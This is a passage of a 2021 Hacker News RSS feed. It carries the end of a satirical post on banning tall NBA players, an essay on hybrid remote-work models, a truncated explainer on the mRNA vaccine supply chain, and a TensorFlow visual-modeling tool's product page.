<p>This is somewhat true, but isn‚Äôt as big a problem. If you look at the list of NBA greats, many of them are multiple inches shorter than their opponents, and yet still outclassed them with other skills. Being an entire foot shorter is a recipe for disaster, but being a few inches shorter still allows for a relatively even match-up. A 5‚Äô8 player may be locked out completely by a 6‚Äô8 opponent, but he will still be able to compete against a 5‚Äô11 opponent. Once again, this is still not an ideal situation, but that shouldn‚Äôt stop us from taking steps in the right direction.</p>


<hr>



<p>There are millions of children who grow up every year, dreaming of becoming a sports superstar like their idols on television. Most of them will never realize this dream, but every one of them deserves a fair shot at it. </p>



<p>Under the current paradigm, 99% of kids will grow up to realize that they will never be given a fair shake in the NBA, simply due to their genetic height. They will grow up to realize, either consciously or subconsciously, that most of the stars making millions of dollars in the NBA, are there only because of a height discrimination system that unfairly rewards them for being born a certain way, while simultaneously locking out millions others for no fault of their own. We may never be able to bring these numbers down to 0. But it‚Äôs time we tried.</p>
	</div></div>]]>
            </description>
            <link>https://outlookzen.com/2014/06/01/anyone-over-6-feet-should-be-banned-from-the-nba/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25806630</guid>
            <pubDate>Sat, 16 Jan 2021 23:43:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Models of remote work ‚Äì Hybrid will be the norm]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25806604">thread link</a>) | @dpup
<br/>
January 16, 2021 | https://writing.pupius.co.uk/models-of-remote-work-dca47a55b52e | <a href="https://web.archive.org/web/*/https://writing.pupius.co.uk/models-of-remote-work-dca47a55b52e">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><h2 id="14d4">Thoughts on the post-COVID workplace and how hybrid will become the new normal.</h2><div><div><div><div><a href="https://medium.com/@dpup?source=post_page-----dca47a55b52e--------------------------------" rel="noopener"><div><p><img alt="Dan Pupius" src="https://miro.medium.com/fit/c/56/56/0*ErZoBp3C8U3OHEtS.jpeg" width="28" height="28"></p></div></a></div></div></div></div></div><p id="cffa">When we pitched <a href="http://www.range.co/?utm_medium=blog&amp;utm_source=medium&amp;utm_campaign=dan-blogs" target="_blank" rel="noopener">Range</a> in 2017 we didn‚Äôt even talk about remote work. It was part of the thesis, but we quickly found that investors were skeptical about the efficacy of remote teams, and didn‚Äôt see the market potential. Instead, we focused on other changes affecting the workplace: the need for more decentralization and more humanity in our tools.</p><p id="2464">Fast-forward to 2021 and the COVID-19 pan<span id="rmm">d</span>emic has forced millions of people to experience remote work first hand. It hasn‚Äôt been ‚Äúnormal‚Äù remote work for sure, but after a year, companies have had to figure out how to make it work. It‚Äôs starting to look like <a href="https://www.pwc.com/us/en/library/covid-19/us-remote-work-survey.html" target="_blank" rel="noopener">Pandora‚Äôs box has been opened</a>.</p><p id="cee0">Remote work is firmly here to stay, but that doesn‚Äôt mean all companies will be all remote all the time. That‚Äôs an <a href="https://www.wired.com/story/hybrid-remote-work-offers-the-worst-of-both-worlds/" target="_blank" rel="noopener">extreme position</a> and isn‚Äôt pragmatic or desirable for everyone. At the same time, very few companies will go back to being all co-located, all the time.</p><blockquote><p id="8e37">Remote work is firmly here to stay, but that doesn‚Äôt mean all companies will be all remote all the time.</p></blockquote><p id="21a9">Even Netflix‚Äôs <a href="https://www.theverge.com/2020/9/8/21426956/netflix-ceo-reed-hastings-return-to-office-vaccine-working-from-home-negative" target="_blank" rel="noopener">Reed Hastings</a> ‚Äî who thinks that work from home is a ‚Äúpure negative‚Äù ‚Äî concedes that people may be remote one day a week. And while <a href="https://www.nytimes.com/2020/12/14/technology/google-delays-return-to-office-and-eyes-flexible-work-week.html" target="_blank" rel="noopener">Google is requiring that employees live within commute distance of an office</a>, they will only require three days a week in the office. Both these are hybrid models for remote work.</p><p id="7006">Hybrid will be the new normal.</p><p id="6d12">It won‚Äôt be without its challenges and there won‚Äôt be a one-size-fits-all answer, so to get started I want to discuss a few variants that we‚Äôll see emerge.</p><p id="2414">We should expect more companies to follow the path of <a href="https://about.gitlab.com/company/culture/all-remote/guide/" target="_blank" rel="noopener">GitLab</a> and <a href="https://zapier.com/learn/remote-work/" target="_blank" rel="noopener">Zapier</a>, and to become fully distributed, but it will still be a minority. I do expect many startups to begin fully distributed, since it reduces costs and can make hiring easier, but as they grow they will often shift to hybrid models.</p><p id="c141">Being fully distributed requires intentionality in how you structure work processes. You have to actively design systems that facilitate information flow and cultivate belonging. However, because <em>everyone</em> is remote, there is a more of a level playing field, so in some ways is the easier path.</p><p id="9851">Many people can‚Äôt easily work from home; they might have kids or roommates, or no dedicated home office space. Some people simply like the separation of leaving the house, going to work, and being in an office with other people.</p><p id="dea0">To make accommodations for these people, some companies will set up working spaces in urban hubs where there is a critical mass of employees.</p><p id="e47b">However, there will be no fixed expectations around where people are, and as such all work processes will be designed around the assumption that teams won‚Äôt be in the same place at the same time.</p><p id="fec6">Operationally it will be very similar to a fully distributed team. But it will take extra effort to ensure that those working in close proximity don‚Äôt fall back to informal, in-person channels of communication that leave some people feeling excluded.</p><p id="497a">In this model some teammates are remote, some are in the office, but locations are generally consistent. For example, you might work in an office in SF five days a week, while a colleague works from home in Colorado five days a week.</p><p id="411a">Project teams may be ‚Äúdefragged‚Äù, such that a team is all in the same office, while another team is fully distributed.</p><p id="2ba5">Consistency makes it easier to coordinate meetings and there are clear expectations about how different people interact. You and your Colorado colleague will always interact over video chat, you know there‚Äôs a timeshift, while another person on your team sits near you in SF, so you always have your 1:1s on the Embarcadero.</p><p id="3602">This model has predictability and operationally will be familiar to many people, as it was quite common prior to COVID. Back when I worked on Gmail, we were split across several locations in a way that was functionally equivalent to this model.</p><p id="3189">My guess is that this model will become most common.</p><p id="1c7e">People will have reserved desk space at an office. However, teammates are able to fluidly move from working from home (or a coffee shop) to working in the office.</p><p id="189e">Some informal norms will exist, such as being in person for 1:1s or team meetings. And there may be guidance about how many days you can be in the office or working from home. But individuals will generally be free to do what they want.</p><p id="f7d6">This is how many ‚Äúhigh trust‚Äù startups used to operate prior to COVID, but it‚Äôs not without tension. Different people have different expectations about presence, and managers in particular can find themselves frustrated about the lack of predictability.</p><p id="0bb2">I myself remember doing laps of the Medium office looking for someone, only to realize they were randomly WFH.</p><p id="fcbb">With Pandora‚Äôs box open, and only a <a href="https://blog.perceptyx.com/just-4-percent-of-employees-want-to-return-to-the-office-full-time" target="_blank" rel="noopener">small percentage</a> of people wanting to return to the office full-time, management teams who favor in-person collaboration will be forced to make compromises in order to compete for talent.</p><p id="a3b8">A hybrid strategy where everyone is expected to be in the office on a synchronized schedule is more predictable for management and allows for traditional forms of collaboration and meetings to continue (I picture sticky notes on the wall and project plans on communal whiteboards.)</p><p id="e43c">The most common form is likely to be a fixed weekly schedule. For example, ‚ÄúFriday From Home‚Äù or a Tuesday/Thursday split. However, I expect some teams will find that they only need to be in person on the first and last days of a sprint.</p><p id="a709">I‚Äôm optimistic about the changes we‚Äôre seeing. We‚Äôve long known that the 40 hour work week, with it‚Äôs <a href="https://kylechowning.com/butts-in-a-seat/" target="_blank" rel="noopener">butts-in-seats management</a> philosophy, isn‚Äôt how you foster creativity and get the most of people.</p><p id="8868">These shifts in expectations for how we work will create a better world for workers. It shifts the conversation away from what managers need from their teams, to what teams need in order to be successful, and what employees want from their work environment.</p><blockquote><p id="6d0f">Unlocking remote collaboration will create greater flexibility for how we work.</p></blockquote><p id="9c66">Unlocking remote collaboration will create greater flexibility for where and when we work which will allow people to <a href="https://www.range.co/blog/rethinking-the-workweek?utm_medium=blog&amp;utm_source=medium&amp;utm_campaign=dan-blogs" target="_blank" rel="noopener">rethink their workweek</a>, crafting schedules that work for their logistical and <a href="https://www.danpink.com/wp-content/uploads/2017/12/When_Planner.pdf" target="_blank" rel="noopener">creative needs</a>.</p><p id="48a7">One of the reasons I was excited to start <a href="http://www.range.co/?utm_medium=blog&amp;utm_source=medium&amp;utm_campaign=dan-blogs" target="_blank" rel="noopener">Range</a> was to build the tools I wish I had earlier in my career. I felt the need for a new generation of workplace software that help teams be more effective, while addressing both the work-side of work and the human-side of work.</p><p id="c6f3">Today, remote teams use <a href="http://www.range.co/?utm_medium=blog&amp;utm_source=medium&amp;utm_campaign=dan-blogs" target="_blank" rel="noopener">Range</a> to stay connected, focused, and productive. At the core is an asynchronous check-in that‚Äôs better than a standup because it integrates with all the tools you use and saves that valuable in-person time for more important things.</p><p id="9db4">I‚Äôd love to hear about how you‚Äôre thinking about what the post-COVID workplace looks like, and of course I welcome your feedback on Range.</p></div></div></section></div></div>]]>
            </description>
            <link>https://writing.pupius.co.uk/models-of-remote-work-dca47a55b52e</link>
            <guid isPermaLink="false">hacker-news-small-sites-25806604</guid>
            <pubDate>Sat, 16 Jan 2021 23:39:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Exploring the Supply Chain of the Pfizer/BioNTech and Moderna Covid-19 Vaccines]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25806388">thread link</a>) | @mtmail
<br/>
January 16, 2021 | https://blog.jonasneubert.com/2021/01/10/exploring-the-supply-chain-of-the-pfizer-biontech-and-moderna-covid-19-vaccines/ | <a href="https://web.archive.org/web/*/https://blog.jonasneubert.com/2021/01/10/exploring-the-supply-chain-of-the-pfizer-biontech-and-moderna-covid-19-vaccines/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

      <div>
  <p>
     ‚óè 10 Jan 2021
  </p>
  
  <p><em>Sections of this post were co-authored by <a href="https://www.linkedin.com/in/cornelia-scheitz/">Cornelia Scheitz</a>. Last updated on January 18, 2021.</em></p>

<p>Bert Hubert‚Äôs excellent and widely shared article about <a href="https://berthub.eu/articles/posts/reverse-engineering-source-code-of-the-biontech-pfizer-vaccine/">Reverse Engineering the source code of the Pfizer-BioNTech SARS-CoV-2 Vaccine</a> is all it took to turn hundreds of software engineers and other Silicon Valley types into armchair vaccine experts overnight! Jokes aside, the article explains the 4284 base pair long mRNA inside the Pfizer-BioNTech‚Äôs COVID-19 vaccine for those who are more familiar with software than molecular biology.</p>

<p>Bert‚Äôs article is primarily about the biology of the vaccine, how it relates to the virus and how it works in the human body, but there‚Äôs this one sentence about vaccine production:</p>

<blockquote>
  <p>At the very beginning of the vaccine production process, someone uploaded this code to a DNA printer (yes), which then converted the bytes on disk to actual DNA molecules.</p>
</blockquote>

<p>Next to it is a picture of a <a href="https://codexdna.com/products/bioxp-system/">CodexDNA BioXP</a> device that is advertised as producing ‚Äúcustom DNA fragments of up to 7,000 base pairs‚Äù. Could this be the next <a href="https://en.wikipedia.org/wiki/Makers:_The_New_Industrial_Revolution">distributed manufacturing revolution</a>? This time with DNA printers making COVID-19 vaccines in our garages instead of 3D printers and plastic widgets?</p>

<p>I‚Äôll start with the bad news: Nobody will be making an mRNA vaccine in their garage any time soon.</p>

<p>The following text is a collection of notes I wrote down while exploring the process for manufacturing and distributing the two new vaccines that have appeared all over the news and in more and more people‚Äôs arms over the recent weeks. I started reading about mRNA but quickly found myself on tangents about glass vials and temperature tracking devices.</p>

<p>This text was written over a week worth of evenings in early January 2021. It covers the two vaccines currently authorized for distribution in the United States where I live: One by Pfizer-BioNTech and one by Moderna. Several other mRNA based COVID-19 vaccines <a href="https://www.nytimes.com/interactive/2020/science/coronavirus-vaccine-tracker.html">are in various stages of clinical trials</a> and are likely similar to those covered here in some ways and different in others.</p>

<p>It is unlikely that I got everything right. Corrections and suggestions are welcome, please email jn@jonasneubert.com.</p>

<div>
    
        <p><img src="https://blog.jonasneubert.com/assets/2021/2021-01-10-moderna-vaccine-in-fridge.jpg" alt="Source/attribution: U.S. Navy Photo by Elaine Heirigs, NHC/NMRTC Lemoore public affairs/Released, https://www.flickr.com/photos/navymedicine/50755819886/"></p><p>Source/attribution: U.S. Navy Photo by Elaine Heirigs, NHC/NMRTC Lemoore public affairs/Released, https://www.flickr.com/photos/navymedicine/50755819886/</p>
    
</div>

<h2 id="ingredients-list">Ingredients List</h2>

<p>The list of ingredients, or ‚Äúbill of materials‚Äù in engineering parlance, is a good starting point for understanding the supply chain of any product. The ingredient lists for both Pfizer-BioNTech and Moderna‚Äôs vaccines are public and have been widely reported.</p>

<p>The Pfizer-BioNTech vaccine is also known under its code name ‚ÄúBNT162b2‚Äù, it‚Äôs registered trademark ‚ÄúCorminaty‚Äù, and its international non-proprietary name ‚ÄúTozinameran‚Äù. The list of ingredients can be found in information material available on the various country-specific product websites on <a href="https://www.cvdvaccine.com/">www.cvdvaccine.com</a> or government websites like that of the <a href="https://www.gov.uk/government/publications/regulatory-approval-of-pfizer-biontech-vaccine-for-covid-19/information-for-healthcare-professionals-on-pfizerbiontech-covid-19-vaccine">UK‚Äôs MHRA</a>. There‚Äôs also a <a href="https://en.wikipedia.org/wiki/Tozinameran#Manufacturing">Wikipedia page</a>.</p>

<p>The Moderna vaccine is also known as ‚ÄúmRNA-1273‚Äù, but appears to lack a brand name other than ‚ÄúModerna COVID-19 vaccine‚Äù which is what it says on the product label. The list of ingredients can be found on the <a href="https://www.modernatx.com/covid19vaccine-eua/">EUA factsheet on Moderna‚Äôs website</a>, or in these <a href="https://www.fda.gov/media/144434/download">FDA meeting notes</a>. It, too, has a <a href="https://en.wikipedia.org/wiki/MRNA-1273">Wikipedia entry</a>.</p>

<p>The two vaccines share some ingredients but not all. The following table is my attempt to sort the available information and compare the two.</p>

<table>
  <tbody><tr>
   <td>
   </td>
   <td>Pfizer-BioNTech
   </td>
   <td>Moderna
   </td>
  </tr>
  <tr>
   <td colspan="3"><strong><span>Active Ingredient</span></strong>
   </td>
  </tr>
  <tr>
   <td>Comirnaty mRNA
   </td>
   <td>‚úî
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>mRNA-1273 mRNA
   </td>
   <td>
   </td>
   <td>‚úî
   </td>
  </tr>
  <tr>
   <td colspan="3"><strong><span>Lipids</span></strong>
   </td>
  </tr>
  <tr>
   <td>Cholesterol
   </td>
   <td>‚úî
   </td>
   <td>‚úî
   </td>
  </tr>
  <tr>
   <td>1,2-distearoyl-sn-glycero-3-phosphocholine (DSPC)
   </td>
   <td>‚úî
   </td>
   <td>‚úî
   </td>
  </tr>
  <tr>
   <td>(4-hydroxybutyl)azanediyl)bis(hexane-6,1-diyl)bis(2- hexyldecanoate) (ALC-3015)
   </td>
   <td>‚úî
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>2-[(polyethylene glycol)-2000]-N,N-ditetradecylacetamide (ALC-0159)
   </td>
   <td>‚úî
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>Lipid SM-102
   </td>
   <td>
   </td>
   <td>‚úî
   </td>
  </tr>
  <tr>
   <td>1,2-dimyristoyl-rac-glycero-3-methoxypolyethylene glycol-2000 (PEG2000-DMG)
   </td>
   <td>
   </td>
   <td>‚úî
   </td>
  </tr>
  <tr>
   <td colspan="3"><strong><span>Buffer</span></strong>
   </td>
  </tr>
  <tr>
   <td>potassium chloride
   </td>
   <td>‚úî
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>monobasic potassium phosphate
   </td>
   <td>‚úî
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>sodium chloride
   </td>
   <td>‚úî
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>basic sodium phosphate dihydrate
   </td>
   <td>‚úî
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>tromethamine (tris(hydroxymethyl)aminomethane)
   </td>
   <td>
   </td>
   <td>‚úî
   </td>
  </tr>
  <tr>
   <td>tromethamine hydrochloride
   </td>
   <td>
   </td>
   <td>‚úî
   </td>
  </tr>
  <tr>
   <td>acetic acid
   </td>
   <td>
   </td>
   <td>‚úî
   </td>
  </tr>
  <tr>
   <td>sodium acetate
   </td>
   <td>
   </td>
   <td>‚úî
   </td>
  </tr>
  <tr>
   <td>water
   </td>
   <td>‚úî
   </td>
   <td>‚úî
   </td>
  </tr>
  <tr>
   <td colspan="3"><strong><span>Other</span></strong>
   </td>
  </tr>
  <tr>
   <td>sucrose
   </td>
   <td>‚úî
   </td>
   <td>‚úî
   </td>
  </tr>
</tbody></table>

<p>In addition to what‚Äôs in the vaccine vial, Pfizer-BioNTech needs to be diluted with sodium chloride shortly before use (more about that below). The Moderna vaccine does not seem to require such a ‚ÄúDIY assembly‚Äù step.</p>

<p>Now that we know all the ingredients, let‚Äôs go shopping.</p>

<p>Disclaimer: Please don‚Äôt perform chemistry or create pharmaceuticals unless you have the appropriate safety training and equipment. I include links to online shops below, but note that they sell ‚Äúfor research use only‚Äù and will verify your affiliation with a research organization before taking your business.</p>

<h2 id="mrna">mRNA</h2>

<p>To make RNA, you start by making DNA. This makes sense if you know the <a href="https://en.wikipedia.org/wiki/Central_dogma_of_molecular_biology">central dogma of molecular biology</a> which, for the purposes of this article, can be simplified to ‚ÄúDNA makes RNA, and RNA makes protein‚Äù.  Making DNA is a known, stable process in 3 steps:</p>

<ol>
  <li><strong>Create:</strong> Synthesize a small number of copies of the desired DNA, somehow. There are vendors for this sort of thing such as <a href="https://twistbioscience.com/">Twist Bioscience</a> just down the street from my apartment when I lived in San Francisco.</li>
  <li><strong>Copy:</strong>
    <ol>
      <li>Insert this DNA into innocent <a href="https://en.wikipedia.org/wiki/Escherichia_coli">E. coli bacteria</a> by means of <a href="https://en.wikipedia.org/wiki/Electrophoresis">electrophoresis</a>, i.e. zapping them.</li>
      <li>Put those bacteria into a stainless steel growth chamber full of nutrients and let them multiply for four days.</li>
      <li>Drain the vat, kill the bacteria, and <a href="https://en.wikipedia.org/wiki/DNA_extraction">extract the DNA</a>. Depending on growth chamber volume, this may take one week or longer.</li>
    </ol>
  </li>
  <li><strong>Verify:</strong> Perform several tests to confirm that the DNA you got is the DNA you wanted. There‚Äôs no need for me to explain how testing for the presence of specific DNA sequences works, y‚Äôall learned that nine months ago when you did your reading about how COVID-19 tests work.</li>
</ol>

<p>This yields grams of DNA and what is needed are bags of mRNA. mRNA is the most discussed ingredient of the vaccine for three reasons:</p>

<ol>
  <li>mRNA is the active ingredient of the vaccine.</li>
  <li>It is the first time an mRNA vaccine has been approved and is now produced at scale.</li>
  <li>The skills to produce mRNA at scale and the associated supply chain are new.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>
The conversion process from DNA to mRNA in living cells is well understood. However, doing it at scale, in a factory, and with a long shelf-life is still an area of development. To multiply the DNA we utilized E.coli and this tiny organism comes with all components needed for the job. The same process does not work for making mRNA for the vaccine. Instead, the DNA gets combined with nucleotides, polymerase, and special enzymes that protect the mRNA.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></li>
</ol>

<ul>
  <li><a href="https://en.wikipedia.org/wiki/Nucleotide">Nucleotides</a> are the raw building blocks for the mRNA.</li>
  <li>RNA <a href="https://en.wikipedia.org/wiki/Polymerase">Polymerases</a> read DNA and translate it to mRNA using these nucleotides.</li>
  <li>Enzymes add a cap and a tail to the mRNA to protect it.</li>
</ul>

<p>The third part, protecting the mRNA, is the crux of the matter. mRNA is not very stable especially at the ends. If you lose the first and last word of a sentence its meaning may be lost entirely. The same can happen here and the vaccine would not work anymore. To protect the beginning of the mRNA statement, a <a href="https://en.wikipedia.org/wiki/Five-prime_cap">5‚Äô cap</a> is added using a mRNA Cap 2‚Ä≤-O-Methyltransferase and the vaccinia capping enzyme (VCE). (The ‚Äúvaccinia‚Äù in the name has nothing to do with vaccines.) To protect the end of the mRNA we add a <a href="https://en.wikipedia.org/wiki/Polyadenylation">poly(A) tail</a> to the message using a Poly(A)Polymerase. New England Biolabs‚Äô online store lists prices for <a href="https://www.neb.com/products/m0366-mrna-cap2-o-methyltransferase">mRNA Cap</a>, <a href="https://www.neb.com/products/m2080-vaccinia-capping-system">VCE</a>, and <a href="https://www.neb.com/products/m0276-ecoli-poly-a-polymerase">Poly(A)Polymerase</a>.</p>

<p>All ingredients of the vaccine besides the mRNA are ‚Äú<a href="https://en.wikipedia.org/wiki/Excipient">excipients</a>‚Äù, substances whose purpose is somehow related to getting the vaccine from the factory into a human cell.</p>

<h2 id="lipids">Lipids</h2>

<p>Lipids are fatty molecules. Each of the two vaccines contains four types of lipid. Cholesterol, phosphatidylcholine, an ionizable cationic lipid, and PEGylated phospholipds. In the vaccine, these lipids form a capsule around the RNA called <a href="https://en.wikipedia.org/wiki/Solid_lipid_nanoparticle">lipid nanoparticle</a> (LNP) that protects it from the hostile environment until it is inside a human cell.</p>

<p>Both Pfizer-BioNTech and Moderna use the same structural components which are already approved in many drugs.</p>

<ul>
  <li><strong>DSPC</strong>, full name <a href="https://en.wikipedia.org/wiki/Distearoylphosphatidylcholine">Distearoylphosphatidylcholine</a> or 1,2-distearoyl-sn-glycero-3-phosphocholine, is the main component of the lipid bilayer that protects the mRNA.</li>
  <li><strong>Cholesterol</strong> is natural to the human body. In the vaccine it is used to achieve optimal liposome formation and structure.</li>
</ul>

<p>The other two ingredients are used to optimize the LNPs for its cargo and the delivery<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> and are novel or uncommon in drug formulation.</p>

<ul>
  <li><strong>Cationic</strong>, or positively charged, lipids bind to and help stabilize the negatively charged mRNA during assembly. Once inside the cell, the cell‚Äôs different pH environment triggers the release of mRNA.
    <ul>
      <li>
        <p>Pfizer-BioNTech uses <a href="https://en.wikipedia.org/wiki/ALC-0315">ALC-3015</a> patented by Acuitas Therapeutics, Inc.<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></p>
      </li>
      <li>
        <p>Moderna has a proprietary molecule called Lipid SM-102. Or maybe it isn‚Äôt that proprietary, because it might be covered by a patent owned by Arbutus Biopharma.<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup> Moderna‚Äôs <a href="https://www.modernatx.com/sites/default/files/mRNA-1273-P301-Protocol.pdf">Phase 3 Clinical Study Protocol</a> defines it as ‚Äúheptadecan-9-yl 8-((2-hydroxyethyl) (6-oxo-6-(undecyloxy)hexyl)amino)octanoate‚Äù and calls it a ‚Äúproprietary ionizable lipid‚Äù. In 2018, Moderna researchers published <a href="https://www.cell.com/molecular-therapy-family/molecular-therapy/pdfExtended/S1525-0016(18)30118-7">a Cell paper</a> proposing 10 new lipids, of which SM-102 is number 8, according to <a href="https://twitter.com/1stClef/status/1306653592691113986">this tweet</a>. The paper has a ‚Äúsynthesis‚Äù section and supplementary materials which somebody more knowledgeable about such things than I might be able to reproduce. Everyone else will have to purchase it, for example from <a href="https://organixinc.com/lipids/atx001-crrdc-b9dnh-phs3e">Organix Inc at $5,000/100mg</a>.</p>
      </li>
    </ul>
  </li>
  <li><strong>PEGylated phospholipids</strong> help stabilize the LNP and protect it from early detection by our immune system. It ensures the LNPs and thus the mRNA can reach its target.
    <ul>
      <li>Pfizer-BioNTech uses <a href="https://en.wikipedia.org/wiki/ALC-0159">ALC-0159</a>.</li>
      <li>Moderna uses DMG-PEG 2000 or ‚Ä¶</li></ul></li></ul></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.jonasneubert.com/2021/01/10/exploring-the-supply-chain-of-the-pfizer-biontech-and-moderna-covid-19-vaccines/">https://blog.jonasneubert.com/2021/01/10/exploring-the-supply-chain-of-the-pfizer-biontech-and-moderna-covid-19-vaccines/</a></em></p>]]>
            </description>
            <link>https://blog.jonasneubert.com/2021/01/10/exploring-the-supply-chain-of-the-pfizer-biontech-and-moderna-covid-19-vaccines/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25806388</guid>
            <pubDate>Sat, 16 Jan 2021 23:07:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Visual API for TensorFlow]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25806363">thread link</a>) | @E-Reverance
<br/>
January 16, 2021 | https://www.perceptilabs.com/home | <a href="https://web.archive.org/web/*/https://www.perceptilabs.com/home">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-1fb32d1e=""><div data-v-1fb32d1e=""> <div id="features" data-v-1fb32d1e=""><div data-v-7756f45a="" data-v-1fb32d1e=""><div data-v-7756f45a=""><div data-v-609f4bc6="" data-v-7756f45a=""> <div data-v-7756f45a="">  <div data-v-7756f45a=""> <p>
            A visual modeling tool
          </p> <div data-v-7756f45a=""><p data-v-7756f45a="">
              To build a custom model like simple linear regression, or
              something more complex like a GAN, just drag and drop components
              to start.
            </p> <p data-v-7756f45a="">
              PerceptiLabs wraps low-level TensorFlow code to create visual
              components, so you‚Äôll see your model‚Äôs architecture as you
              build.
            </p> <p><strong data-v-7756f45a="">
              You‚Äôll build models faster and easier with PerceptiLabs.
            </strong></p></div> </div></div></div></div> <div data-v-7756f45a=""><div data-v-609f4bc6="" data-v-7756f45a=""> <div data-v-7756f45a="">  <div data-v-7756f45a=""> <p>
            Real-time insights
          </p> <div data-v-7756f45a=""><p data-v-7756f45a="">
              See real-time analytics and granular previews of output from
              each model component. You can easily track and understand the
              gradients‚Äô behavior, perform real-time debugging, and see where
              to optimize your model.
            </p> <p><strong data-v-7756f45a="">
              It's never been easier to debug and interpret your model.
            </strong></p></div> </div></div></div></div> <div data-v-7756f45a=""><div data-v-609f4bc6="" data-v-7756f45a=""> <div data-v-7756f45a="">  <div data-v-7756f45a=""> <p>
            Keep track of models and share on GitHub
          </p> <div data-v-7756f45a=""><p data-v-7756f45a="">
              PerceptiLabs lets you manage multiple models, compare them, and
              easily share the results back to your team. Export your model as
              a TensorFlow model or as a Jupyter Notebook.
            </p> <p><strong data-v-7756f45a="">
              That‚Äôs machine learning at warp speed.
            </strong></p></div> </div></div></div></div> <div data-v-7756f45a=""><div data-v-609f4bc6="" data-v-7756f45a=""><p>
        Get started now. Free for developers.
      </p> <div data-v-7756f45a=""> <div id="code" data-v-7756f45a=""><p><img src="https://www.perceptilabs.com/images/home/PL-how-to-01.png" width="420" data-v-7756f45a=""></p><div data-v-7756f45a=""><div data-v-7756f45a=""><p><code data-v-7756f45a="">$ pip install perceptilabs</code></p><p>
                click to copy
              </p></div> <div data-v-7756f45a=""><p><code data-v-7756f45a="">$ perceptilabs</code></p><p>
                click to copy
              </p></div></div></div> </div></div></div> <div data-v-7756f45a=""><div data-v-609f4bc6="" data-v-7756f45a=""> <p>
        Check out some of our features
      </p> <div data-v-7756f45a=""><p><img src="https://www.perceptilabs.com/images/home/PL-gui-code.png" data-v-7756f45a=""> <span data-v-7756f45a="">Toggle between GUI and code</span></p> <p><img src="https://www.perceptilabs.com/images/home/PL-github.png" data-v-7756f45a=""> <span data-v-7756f45a="">
            Export and share to GitHub and Jupyter
          </span></p> <p><img src="https://www.perceptilabs.com/images/home/PL-training-GPUs.png" data-v-7756f45a=""> <span data-v-7756f45a="">
            Automatically distributes training on available GPUs
          </span></p> <p><img src="https://www.perceptilabs.com/images/home/PL-vis.png" data-v-7756f45a=""> <span data-v-7756f45a="">
            Auto-generated visualizations for every single variable in the
            model
          </span></p> <p><img src="https://www.perceptilabs.com/images/home/PL-debug.png" data-v-7756f45a=""> <span data-v-7756f45a="">
            Easy debugging with warnings and recommendations
          </span></p></div></div></div> </div></div> <div id="presentation" data-v-1fb32d1e=""><div data-v-26d2c40d="" data-v-1fb32d1e=""><div data-v-26d2c40d=""><div track-id="News - PerceptiLabs named to the CB Insights AI 100" data-v-7bd592ed="" data-v-26d2c40d=""> <div data-v-7bd592ed=""><p data-v-7bd592ed="">News</p> <p data-v-7bd592ed="">PerceptiLabs named to the CB Insights AI 100</p>  </div></div></div><div data-v-26d2c40d=""><div track-id="Blog - Getting inside the head of a machine learning scientist" data-v-7bd592ed="" data-v-26d2c40d=""> <div data-v-7bd592ed=""><p data-v-7bd592ed="">Blog</p> <p data-v-7bd592ed="">Getting inside the head of a machine learning scientist</p>  </div></div></div></div></div>  </div></div></div>]]>
            </description>
            <link>https://www.perceptilabs.com/home</link>
            <guid isPermaLink="false">hacker-news-small-sites-25806363</guid>
            <pubDate>Sat, 16 Jan 2021 23:04:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Greens: We eat the leaves that we do]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25806012">thread link</a>) | @jsnell
<br/>
January 16, 2021 | https://botanistinthekitchen.blog/2013/04/08/greens-why-we-eat-the-leaves-that-we-do/ | <a href="https://web.archive.org/web/*/https://botanistinthekitchen.blog/2013/04/08/greens-why-we-eat-the-leaves-that-we-do/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<p><em>Jeanne</em>&nbsp;<em>reveals which branches of the evolutionary tree of plants bear edible leaves and speculates about why that is.</em></p>
